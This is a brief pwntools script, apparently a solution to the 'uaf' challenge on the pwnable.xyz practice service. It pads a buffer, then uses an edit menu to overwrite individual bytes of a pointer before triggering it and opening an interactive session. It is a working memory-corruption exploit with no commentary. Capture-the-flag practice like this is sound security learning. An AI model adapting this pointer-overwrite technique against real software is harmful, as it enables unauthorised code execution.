from pwn import *
#p = process("./uaf")
p = remote("svc.pwnable.xyz", 30015)
elf = ELF("./uaf")

def edit_char(v1, v2):
	p.sendlineafter(">", "5")

	p.sendline(v1)
	p.sendline(v2)

if __name__ == "__main__":
	p.send("a" * 127)
	for i in range(5):
		edit_char("p", "a")
	edit_char("\x0d", "\x0c")
	edit_char("\x6b", "\xf3")
	p.sendline("1")
	p.interactive()
